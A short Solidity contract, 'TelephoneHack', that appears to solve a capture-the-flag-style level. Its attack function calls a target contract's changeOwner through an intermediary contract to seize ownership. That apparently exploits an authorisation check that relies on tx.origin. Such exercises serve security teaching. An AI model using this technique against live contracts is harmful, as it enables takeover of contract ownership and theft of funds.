// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;
import "./Telephone.sol";

contract TelephoneHack {

  Telephone telephone;

  constructor(address _target) {
    telephone = Telephone(_target) ;
  }

  function attack() public {
    telephone.changeOwner(msg.sender);
  }
}
